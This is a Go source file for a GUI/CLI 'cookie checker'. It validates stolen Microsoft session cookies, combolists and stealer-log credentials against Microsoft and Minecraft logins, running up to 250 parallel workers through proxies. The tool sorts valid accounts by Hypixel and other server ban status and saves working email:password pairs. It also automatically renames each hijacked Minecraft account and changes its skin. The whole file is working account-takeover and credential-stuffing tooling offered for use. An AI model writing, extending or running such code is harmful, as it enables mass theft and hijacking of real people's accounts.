package main

import (
	"context"
	"embed"
	"errors"
	"flag"
	"fmt"
	"io"
	"net/http"
	"net/url"
	"os"
	"path/filepath"
	"runtime/debug"
	"strings"
	"sync"
	"sync/atomic"
	"time"

	"github.com/wailsapp/wails/v2"
	"github.com/wailsapp/wails/v2/pkg/options"
	"github.com/wailsapp/wails/v2/pkg/options/assetserver"


	"cookie_checker/auth"
	"cookie_checker/internal/cookiefile"
	"cookie_checker/internal/extract"
	"cookie_checker/internal/hypixel"
	"cookie_checker/internal/namechange"
)

type job struct {
	kind     string // cookie | cred
	path     string // cookie file path
	email    string
	password string
	label    string // display / results label
}

var (
	hitsDir              string
	hitsBannedDir        string
	hitsOKDir            string
	hitsNeverDir         string
	hitsHypErrDir        string
	hitsDonutUnbannedDir string
	hitsDonutBannedDir   string
	hitsMinemenUnbannedDir string
	hitsMinemenBannedDir   string
	invalidDir           string
	noMCDir              string
	cookiesDir           = "cookies"
	resultsRoot          = "results"
	resultsDir           string
	resultsFile          string
	errorsFile           string
	doHypixel            = true
	relocateMode         = "copy" // copy | move | none
	doRename             = true   // rename + re-skin every hit account
	skinFilePath         string   // path to local PNG skin file; empty = skip skin upload
	skinVariant          = "classic"

	errLogMu   sync.Mutex
	errLog     *os.File
	lastErrMsg atomic.Value // string
)

const (
	colorReset  = "\033[0m"
	colorGreen  = "\033[32m"
	colorYellow = "\033[33m"
	colorRed    = "\033[31m"
	colorMag    = "\033[35m"
	colorCyan   = "\033[36m"
)

//go:embed all:frontend/dist
	var assets embed.FS

func main() {
	// Optimize Go garbage collector and memory settings for lower memory footprint
	// Relaxed settings to prevent stuttering/lag while keeping memory controlled
	debug.SetGCPercent(85)                  // Slightly active GC (default is 100)
	debug.SetMemoryLimit(512 * 1024 * 1024) // Soft limit of 512 MB to prevent thrashing

	// Release memory to OS less frequently (every 30 seconds) to avoid thread blocking and stutter
	go func() {
		ticker := time.NewTicker(30 * time.Second)
		for range ticker.C {
			debug.FreeOSMemory()
		}
	}()

	if len(os.Args) == 1 || (len(os.Args) > 1 && os.Args[1] == "--gui") {
		app := NewApp()

		err := wails.Run(&options.App{
			Title:     "Generic Checker",
			Width:     1280,
			Height:    800,
			MinWidth:  900,
			MinHeight: 600,
			Frameless: true,
			AssetServer: &assetserver.Options{
				Assets: assets,
			},
			BackgroundColour: &options.RGBA{R: 8, G: 8, B: 8, A: 255},
			OnStartup:        app.startup,
			Bind: []interface{}{
				app,
			},
		})
		if err != nil {
			println("Error:", err.Error())
		}
		return
	}
	runCLI()
}

func runCLI() {
	if len(os.Args) > 1 && os.Args[1] == "extract" {
		os.Exit(runExtract(os.Args[2:]))
	}

	workers := flag.Int("w", 250, "concurrent checks (default 250 for high CPM)")
	noSort := flag.Bool("no-sort", false, "do not copy/move files into results folders")
	doMove := flag.Bool("move", false, "move files into results instead of copying (deletes from cookies/)")
	timeout := flag.Duration("timeout", 25*time.Second, "per-request HTTP client timeout")
	dir := flag.String("dir", "cookies", "directory containing cookie files")
	comboPath := flag.String("combo", "", "extra combolist file/dir (in addition to auto-scan of -dir)")
	ulpPath := flag.String("ulp", "", "extra ULP/passwords file/dir (in addition to auto-scan of -dir)")
	ulpAll := flag.Bool("ulp-all", false, "keep all ULP hosts (default: Microsoft-related only)")
	noCookies := flag.Bool("no-cookies", false, "skip cookie file checks")
	noCreds := flag.Bool("no-creds", false, "skip auto combolist/ULP/passwords discovery in -dir")
	proxyFile := flag.String("proxies", "proxies.txt", "proxy list file (required when Hypixel check is on)")
	noHypixel := flag.Bool("no-hypixel", false, "skip automatic Hypixel ban check on hits")
	noDonut := flag.Bool("no-donut", false, "skip automatic DonutSMP ban check on hits")
	runName := flag.String("run", "", "results subfolder name (default: timestamp)")
	allFiles := flag.Bool("all", false, "check all cookie-like files (skip MSPAuth session prefilter scan)")
	noRename := flag.Bool("no-rename", false, "skip automatic name and skin change on hits")
	skinFile := flag.String("skin-file", "", "path to local PNG skin file applied on every hit (empty = no skin change)")
	skinVarFlag := flag.String("skin-variant", "classic", "skin model variant: classic or slim")
	flag.Parse()

	relocate := "copy"
	if *noSort {
		relocate = "none"
	} else if *doMove {
		relocate = "move"
	}

	cfg := CheckConfig{
		CookiesDir:  *dir,
		ComboPath:   *comboPath,
		ULPPath:     *ulpPath,
		ProxyFile:   *proxyFile,
		Workers:     *workers,
		TimeoutSec:  int(timeout.Seconds()),
		DoHypixel:   !*noHypixel,
		DoDonut:     !*noDonut,
		DoRename:    !*noRename,
		SkinFile:    *skinFile,
		SkinVariant: *skinVarFlag,
		AllFiles:    *allFiles,
		NoCookies:   *noCookies,
		NoCreds:     *noCreds,
		ULPAll:      *ulpAll,
		Relocate:    relocate,
		RunName:     *runName,
	}

	fmt.Printf("run starting | workers=%d", cfg.Workers)
	if cfg.DoHypixel {
		fmt.Print(" | hypixel=on")
	}
	if cfg.DoRename {
		fmt.Print(" | rename=on")
	}
	if cfg.AllFiles {
		fmt.Print(" | all-files=on")
	}
	fmt.Println()

	if err := runChecker(context.Background(), cfg, CheckHooks{PrintTerminal: true}); err != nil {
		fmt.Fprintf(os.Stderr, "%v\n", err)
		os.Exit(1)
	}
}

func runExtract(args []string) int {
	fs := flag.NewFlagSet("extract", flag.ExitOnError)
	out := fs.String("o", "cookies", "output folder for numbered MS cookie files")
	allMS := fs.Bool("all-ms", false, "keep files with any MS-domain cookies (default: session cookies required)")
	fs.Usage = func() {
		fmt.Fprintf(os.Stderr, "Usage: %s extract [flags] <dump-directory>\n\n", os.Args[0])
		fmt.Fprintf(os.Stderr, "Crawl every .txt under the dump directory and write Microsoft cookies as 1.txt, 2.txt, ...\n\n")
		fs.PrintDefaults()
	}
	_ = fs.Parse(args)
	if fs.NArg() < 1 {
		fs.Usage()
		return 2
	}

	root := fs.Arg(0)
	info, err := os.Stat(root)
	if err != nil || !info.IsDir() {
		fmt.Fprintf(os.Stderr, "Not a directory: %s\n", root)
		return 1
	}

	st, err := extract.Run(extract.Options{
		Root:           root,
		OutDir:         *out,
		RequireSession: !*allMS,
	})
	if err != nil {
		fmt.Fprintf(os.Stderr, "extract failed: %v\n", err)
		return 1
	}
	fmt.Printf("done: wrote %d -> %s (scanned %d)\n", st.Written, *out, st.Scanned)
	return 0
}

func sanitizeRunName(name string) string {
	replacer := strings.NewReplacer(
		`<`, "_", `>`, "_", `:`, "-", `"`, "_", `/`, "_", `\`, "_", `|`, "_", `?`, "_", `*`, "_",
	)
	name = strings.TrimSpace(replacer.Replace(name))
	if name == "" || name == "." || name == ".." {
		return time.Now().Format("2006-01-02_15-04-05")
	}
	return name
}

func processOne(checker *auth.Checker, path string, proxyURL *url.URL) auth.Result {
	rel := path
	if r, err := filepath.Rel(cookiesDir, path); err == nil {
		rel = r
	}

	cs, err := cookiefile.ParseFile(path)
	if err != nil {
		res := auth.Result{Status: auth.StatusError, File: rel, Reason: "Parse error: " + err.Error()}
		relocate(path, invalidDir)
		return res
	}
	// Full browser dumps include thousands of unrelated cookies — MSA auth only
	// wants live/microsoft/xbox cookies (same as extract). Sending everything → HTTP 400.
	cs = cookiefile.FilterMS(cs)
	if len(cs) == 0 {
		res := auth.Result{
			Status: auth.StatusInvalid,
			File:   rel,
			Reason: "No Microsoft-domain cookies",
		}
		relocate(path, invalidDir)
		return res
	}

	header := cookiefile.ToHeader(cs)
	if header == "" {
		res := auth.Result{
			Status: auth.StatusInvalid,
			File:   rel,
			Reason: "MS cookies present but Cookie header empty after sanitize",
		}
		relocate(path, invalidDir)
		return res
	}
	email := cookiefile.GuessEmail(header)
	ctx := context.Background()
	res := checker.Check(ctx, header, rel, email)
	return finishHit(res, path, proxyURL, false, nil, checker.Client)
}

func processCred(checker *auth.Checker, email, password, label string, proxyURL *url.URL, comboHitMu *sync.Mutex) auth.Result {
	ctx := context.Background()
	res := checker.CheckPassword(ctx, email, password, label)
	return finishHit(res, "", proxyURL, true, comboHitMu, checker.Client)
}

// applyNameAndSkin renames the hit account to a generated g00n_XXXX name and
// uploads the configured skin PNG. Both operations are attempted independently;
// failures are recorded in res.NameChangeErr / res.SkinChangeErr.
func applyNameAndSkin(ctx context.Context, client *http.Client, res *auth.Result) {
	newName := namechange.GenerateName()
	if err := namechange.ChangeName(ctx, client, res.AccessToken, newName); err != nil {
		switch {
		case errors.Is(err, namechange.ErrNotEligible):
			// Account is on Mojang's 30-day rename cooldown or otherwise restricted.
			res.NameChangeErr = "not changeable"
		case errors.Is(err, namechange.ErrNameUnavailable):
			// The randomly-generated name happened to be taken; not a real blocker.
			res.NameChangeErr = "name taken (try again)"
		default:
			res.NameChangeErr = err.Error()
		}
	} else {
		res.NewUsername = newName
		res.NameChanged = true
	}
	if skinFilePath != "" {
		if err := namechange.ChangeSkinFromFile(ctx, client, res.AccessToken, skinFilePath, skinVariant); err != nil {
			res.SkinChangeErr = err.Error()
		} else {
			res.SkinChanged = true
		}
	}
}

func finishHit(res auth.Result, cookiePath string, proxyURL *url.URL, isCred bool, comboHitMu *sync.Mutex, client *http.Client) auth.Result {
	ctx := context.Background()

	// Rename + re-skin the account BEFORE the Hypixel join so the server sees
	// the new username in the Login Start packet (required for a valid session).
	if res.Status == auth.StatusHit && doRename && res.AccessToken != "" {
		applyNameAndSkin(ctx, client, &res)
	}

	if res.Status == auth.StatusHit && doHypixel {
		// After a successful rename the Login Start name must match the new IGN.
		joinName := res.Username
		if res.NewUsername != "" {
			joinName = res.NewUsername
		}
		if res.AccessToken == "" || joinName == "" {
			res.HypixelStatus = string(hypixel.StatusError)
			res.HypixelReason = "HIT without MC token/username (cannot join Hypixel)"
		} else {
			hr := hypixel.Check(ctx, res.AccessToken, joinName, res.UUID, proxyURL)
			res.HypixelStatus = string(hr.Status)
			res.HypixelReason = hr.Reason
			res.HypixelBanDuration = hr.BanDuration
		}
		status := "error"
		destDir := hitsHypErrDir
		switch hypixel.Status(res.HypixelStatus) {
		case hypixel.StatusBanned:
			destDir = hitsBannedDir
			if isSecurityBlock(res.HypixelReason) {
				status = "blocked"
			} else {
				status = "banned"
			}
		case hypixel.StatusUnbanned:
			destDir = hitsOKDir
			status = "unbanned"
		case hypixel.StatusNeverJoined:
			destDir = hitsNeverDir
			status = "never"
		}
		if isCred {
			writeCredHit(res, destDir, status, comboHitMu)
		} else {
			relocateAs(cookiePath, destDir, hitFilename(res.Username, status))
		}
		return res
	}

	if res.Status == auth.StatusHit {
		res.HypixelStatus = "skipped"
		if isCred {
			writeCredHit(res, hitsDir, "hit", comboHitMu)
		} else {
			relocateAs(cookiePath, hitsDir, hitFilename(res.Username, "hit"))
		}
		return res
	}

	if isCred {
		return res
	}
	switch res.Status {
	case auth.StatusNoMinecraft:
		relocate(cookiePath, noMCDir)
	default:
		relocate(cookiePath, invalidDir)
	}
	return res
}

func writeCredHit(res auth.Result, destDir, status string, mu *sync.Mutex) {
	if relocateMode == "none" {
		return
	}
	line := res.Email + ":" + res.Password
	if res.Email == "" || res.Password == "" {
		return
	}
	_ = os.MkdirAll(destDir, 0o755)
	base := hitFilename(res.Username, status)
	if res.Username == "" {
		base = hitFilename(sanitizeFilename(res.Email), status)
	}
	dest := uniquePath(destDir, base)
	_ = os.WriteFile(dest, []byte(line+"\n"), 0o644)

	// Append to a flat combo hits list for easy import.
	if mu != nil {
		mu.Lock()
		defer mu.Unlock()
	}
	f, err := os.OpenFile(filepath.Join(resultsDir, "hits_combo.txt"), os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0o644)
	if err != nil {
		return
	}
	_, _ = f.WriteString(line + "\n")
	_ = f.Close()
}

func printResult(r auth.Result, n, total int64, start time.Time, hitsN, deadN, noMCN, errN *atomic.Int64) {
	switch r.Status {
	case auth.StatusHit:
		ign := safePrint(r.Username)
		if ign == "" || ign == "?" {
			ign = "?"
		}
		if em := safePrint(r.Email); em != "" && em != "?" {
			ign = ign + " | " + em
		}
		// Show rename / skin outcome inline with the IGN.
		if r.NameChanged {
			switch {
			case r.SkinChanged:
				ign += " -> " + r.NewUsername + " [name+skin changed]"
			case r.SkinChangeErr != "":
				ign += " -> " + r.NewUsername + " [name changed, skin ERR: " + truncateErr(r.SkinChangeErr, 35) + "]"
			default:
				ign += " -> " + r.NewUsername + " [name changed]"
			}
		} else if r.NameChangeErr != "" {
			switch r.NameChangeErr {
			case "not changeable":
				// Account is on Mojang's 30-day rename cooldown.
				ign += " [not changeable]"
			case "name taken (try again)":
				// The random g00n_ name collided; not the account's fault.
				ign += " [name taken — retry]"
			default:
				ign += " [rename ERR: " + truncateErr(r.NameChangeErr, 40) + "]"
			}
		}
		label, color := "HIT", colorGreen
		switch hypixel.Status(r.HypixelStatus) {
		case hypixel.StatusBanned:
			if isSecurityBlock(r.HypixelReason) {
				label, color = "BLOCKED", colorRed
			} else {
				color = colorRed
				if r.HypixelBanDuration != "" {
					label = "BANNED | " + r.HypixelBanDuration
				} else {
					label = "BANNED"
				}
			}
		case hypixel.StatusUnbanned:
			label, color = "UNBANNED", colorGreen
		case hypixel.StatusNeverJoined:
			label, color = "NEVER", colorYellow
		case hypixel.StatusError:
			label, color = "HIT", colorCyan
		}
		fmt.Printf("[%s%s%s] %s\n", color, label, colorReset, ign)
	case auth.StatusNoMinecraft:
		reason := safePrint(r.Reason)
		if reason == "" || reason == "?" {
			reason = "no minecraft"
		}
		fmt.Printf("[%sNO MC%s] %s | %s\n", colorYellow, colorReset, resultWho(r), reason)
	case auth.StatusInvalid:
		reason := safePrint(r.Reason)
		if reason == "" || reason == "?" {
			reason = "invalid"
		}
		who := resultWho(r)
		if r.Email == "" || (len(who) < 80 && !strings.Contains(reason, "password login failed")) {
			fmt.Printf("[%sINVALID%s] %s | %s\n", colorRed, colorReset, who, reason)
		}
	case auth.StatusRateLimited:
		reason := safePrint(r.Reason)
		if reason == "" || reason == "?" {
			reason = "rate limited"
		}
		who := resultWho(r)
		fmt.Printf("[%sRATE LIMITED%s] %s | %s\n", colorYellow, colorReset, who, reason)
	default:
		reason := safePrint(r.Reason)
		if reason == "" || reason == "?" {
			reason = string(r.Status)
			if reason == "" {
				reason = "unknown error"
			}
		}
		lastErrMsg.Store(reason)
	}

	const every = 250
	if n%every == 0 || n == total {
		elapsed := time.Since(start).Seconds()
		cpm := float64(n) / (elapsed / 60.0)
		fmt.Printf("… %d/%d ~%.0f cpm | hits=%d invalid=%d no_mc=%d err=%d\n",
			n, total, cpm, hitsN.Load(), deadN.Load(), noMCN.Load(), errN.Load())
	}
}

func resultWho(r auth.Result) string {
	if em := safePrint(r.Email); em != "" && em != "?" {
		return em
	}
	if f := safePrint(r.File); f != "" && f != "?" {
		return f
	}
	return "?"
}

// safePrint strips non-ASCII/control bytes so binary mis-parses can't trash the terminal.
func safePrint(s string) string {
	if s == "" {
		return "?"
	}
	var b strings.Builder
	b.Grow(len(s))
	for _, r := range s {
		switch {
		case r >= 32 && r < 127:
			b.WriteRune(r)
		case r == '\t':
			b.WriteByte(' ')
		}
	}
	out := strings.TrimSpace(b.String())
	if out == "" {
		return "?"
	}
	if len(out) > 100 {
		return out[:97] + "..."
	}
	return out
}

func truncateErr(s string, n int) string {
	s = safePrint(s)
	if len(s) <= n {
		return s
	}
	return s[:n-3] + "..."
}

func initErrorLog() {
	f, err := os.OpenFile(errorsFile, os.O_CREATE|os.O_WRONLY|os.O_TRUNC, 0o644)
	if err != nil {
		return
	}
	errLog = f
	_, _ = f.WriteString("# status\twho\treason\n")
}

func closeErrorLog() {
	errLogMu.Lock()
	defer errLogMu.Unlock()
	if errLog != nil {
		_ = errLog.Close()
		errLog = nil
	}
}

func appendErrorLog(who, reason string) {
	appendErrorLogStatus("ERROR", who, reason)
}

func appendErrorLogStatus(status, who, reason string) {
	errLogMu.Lock()
	defer errLogMu.Unlock()
	if errLog == nil {
		return
	}
	_, _ = fmt.Fprintf(errLog, "%s\t%s\t%s\n", status, who, reason)
}

func isSecurityBlock(reason string) bool {
	lower := strings.ToLower(reason)
	return strings.Contains(lower, "security-block") ||
		strings.Contains(lower, "has been blocked") ||
		strings.Contains(lower, "account has been blocked")
}

func ensureDirs() {
	dirs := []string{cookiesDir, resultsDir, hitsDir, invalidDir, noMCDir}
	if doHypixel {
		dirs = append(dirs, hitsBannedDir, hitsOKDir, hitsNeverDir, hitsHypErrDir)
	}
	// Donut check always runs — always create its result folders
	dirs = append(dirs, hitsDonutUnbannedDir, hitsDonutBannedDir)
	// Minemen Club check always runs — always create its result folders
	dirs = append(dirs, hitsMinemenUnbannedDir, hitsMinemenBannedDir)
	for _, d := range dirs {
		_ = os.MkdirAll(d, 0o755)
	}
}

func hitFilename(ign, status string) string {
	ign = sanitizeFilename(ign)
	if ign == "" {
		ign = "unknown"
	}
	status = sanitizeFilename(status)
	if status == "" {
		status = "hit"
	}
	return ign + "_" + status + ".txt"
}

func sanitizeFilename(s string) string {
	s = strings.TrimSpace(s)
	if s == "" {
		return ""
	}
	var b strings.Builder
	for _, r := range s {
		switch {
		case r >= 'a' && r <= 'z', r >= 'A' && r <= 'Z', r >= '0' && r <= '9', r == '_', r == '-':
			b.WriteRune(r)
		default:
			b.WriteByte('_')
		}
	}
	out := b.String()
	for strings.Contains(out, "__") {
		out = strings.ReplaceAll(out, "__", "_")
	}
	return strings.Trim(out, "_")
}

func relocate(src, destDir string) {
	relocateAs(src, destDir, filepath.Base(src))
}

func relocateAs(src, destDir, base string) {
	if relocateMode == "none" {
		return
	}
	if _, err := os.Stat(src); err != nil {
		return
	}
	if base == "" {
		base = filepath.Base(src)
	}
	_ = os.MkdirAll(destDir, 0o755)
	dest := uniquePath(destDir, base)
	if relocateMode == "move" {
		_ = os.Rename(src, dest)
		return
	}
	_ = copyFile(src, dest)
}

func uniquePath(destDir, base string) string {
	dest := filepath.Join(destDir, base)
	if _, err := os.Stat(dest); err != nil {
		return dest
	}
	ext := filepath.Ext(base)
	stem := strings.TrimSuffix(base, ext)
	for i := 1; ; i++ {
		cand := filepath.Join(destDir, fmt.Sprintf("%s_%d%s", stem, i, ext))
		if _, err := os.Stat(cand); os.IsNotExist(err) {
			return cand
		}
	}
}

func copyFile(src, dest string) error {
	in, err := os.Open(src)
	if err != nil {
		return err
	}
	defer in.Close()
	out, err := os.Create(dest)
	if err != nil {
		return err
	}
	defer out.Close()
	if _, err := io.Copy(out, in); err != nil {
		return err
	}
	return out.Close()
}

func writeResults(results []auth.Result) {
	var b strings.Builder
	var hits, noMC, dead, errs []auth.Result
	var banned, unbanned, never, hypErr []auth.Result
	for _, r := range results {
		switch r.Status {
		case auth.StatusHit:
			hits = append(hits, r)
			switch hypixel.Status(r.HypixelStatus) {
			case hypixel.StatusBanned:
				banned = append(banned, r)
			case hypixel.StatusUnbanned:
				unbanned = append(unbanned, r)
			case hypixel.StatusNeverJoined:
				never = append(never, r)
			case hypixel.StatusError:
				hypErr = append(hypErr, r)
			}
		case auth.StatusNoMinecraft:
			noMC = append(noMC, r)
		case auth.StatusInvalid:
			dead = append(dead, r)
		default:
			errs = append(errs, r)
		}
	}
	fmt.Fprintf(&b, "Run: %s\n", resultsDir)
	fmt.Fprintf(&b, "Checked %d files\n", len(results))
	fmt.Fprintf(&b, "Hits: %d | No Minecraft: %d | Invalid: %d | Errors: %d\n",
		len(hits), len(noMC), len(dead), len(errs))
	if doHypixel {
		fmt.Fprintf(&b, "Hypixel: banned=%d unbanned=%d never_joined=%d error=%d\n",
			len(banned), len(unbanned), len(never), len(hypErr))
	}
	b.WriteByte('\n')

	writeSection := func(title string, list []auth.Result, withProducts bool) {
		if len(list) == 0 {
			return
		}
		b.WriteString(title + "\n")
		for _, r := range list {
			cred := ""
			if r.Email != "" && r.Password != "" {
				cred = r.Email + ":" + r.Password + "\t"
			}
			if withProducts {
				fmt.Fprintf(&b, "%s%s\t%s\tproducts=%s\thypixel=%s\t%s\n",
					cred, r.File, r.Summary(), strings.Join(r.Products, ","), r.HypixelStatus, r.HypixelReason)
			} else {
				fmt.Fprintf(&b, "%s%s\t%s\n", cred, r.File, r.Reason)
			}
		}
		b.WriteByte('\n')
	}

	if doHypixel {
		writeSection("=== HYPIXEL BANNED ===", banned, true)
		writeSection("=== HYPIXEL UNBANNED ===", unbanned, true)
		writeSection("=== HYPIXEL NEVER JOINED ===", never, true)
		writeSection("=== HYPIXEL CHECK ERROR ===", hypErr, true)
	} else {
		writeSection("=== HITS ===", hits, true)
	}
	writeSection("=== VALID MSA, NO MINECRAFT ===", noMC, false)
	writeSection("=== INVALID / EXPIRED ===", dead, false)
	writeSection("=== ERRORS ===", errs, false)

	_ = os.WriteFile(resultsFile, []byte(b.String()), 0o644)
}
